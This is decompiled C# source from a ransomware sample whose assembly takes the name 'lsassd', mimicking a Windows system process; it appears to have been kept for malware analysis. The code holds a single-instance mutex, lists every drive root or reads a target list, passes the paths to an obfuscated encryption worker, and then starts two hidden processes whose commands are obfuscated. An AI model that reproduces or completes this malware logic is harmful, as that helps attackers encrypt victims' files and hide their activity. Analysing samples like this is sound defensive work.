// Decompiled with JetBrains decompiler
// Type: A.B
// Assembly: lsassd, Version=3.4.1.0, Culture=neutral, PublicKeyToken=null
// MVID: 432C6617-1CB7-4116-A49C-FF7B0B5EE7E5
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\HEUR-Trojan-Ransom.MSIL.Crypmod.gen-b3ebc327773f5f846deeb1255475644a630c4d0d3b4eda3bbf995a36599c07cf.exe

using \u003CPrivateImplementationDetails\u003E\u007B18A11B1C\u002D3AA7\u002D4357\u002DAAD9\u002DCC83BB5216E3\u007D;
using MOISHE.Core;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace A
{
  internal class B
  {
    private static int A([In] string obj0, [In] string[] obj1)
    {
      int num = -1;
      if (obj1 != null && obj1.Length != 0)
      {
        for (int index = 0; index < obj1.Length; ++index)
        {
          if (obj1[index].Equals(obj0))
            return index;
        }
      }
      return num;
    }

    public static void A([In] string[] obj0)
    {
      Mutex mutex = (Mutex) null;
      bool flag = false;
      try
      {
        mutex = new Mutex(true, \u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.aI());
        flag = true;
        List<string> stringList = new List<string>();
        if (obj0 != null)
        {
          if (obj0.Length != 0)
          {
            try
            {
              using (IEnumerator<string> enumerator = ((IEnumerable<string>) File.ReadAllLines(obj0[0])).GetEnumerator())
              {
                while (enumerator.MoveNext())
                {
                  string current = enumerator.Current;
                  if (!string.IsNullOrEmpty(current))
                    stringList.Add(current);
                }
                goto label_17;
              }
            }
            catch
            {
              goto label_17;
            }
          }
        }
        foreach (DirectoryInfo enumerateRoot in FileSystem.EnumerateRoots())
          stringList.Add(enumerateRoot.FullName);
label_17:
        AbstractWorker.ExecuteOnce((ThreadStart) (() => b.a()));
        AbstractWorker.ExecuteOnce((ThreadStart) (() => b.A()));
        new a(stringList).A();
      }
      catch
      {
      }
      finally
      {
        if (flag && mutex != null)
          mutex.Dispose();
      }
      Process process1 = new Process();
      Process process2 = new Process();
      process1.StartInfo.FileName = \u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.ai();
      process1.StartInfo.Arguments = \u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.aJ();
      process1.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
      process1.Start();
      new Process()
      {
        StartInfo = {
          FileName = \u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.aj(),
          Arguments = \u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.aK(),
          WindowStyle = ProcessWindowStyle.Hidden
        }
      }.Start();
    }
  }
}
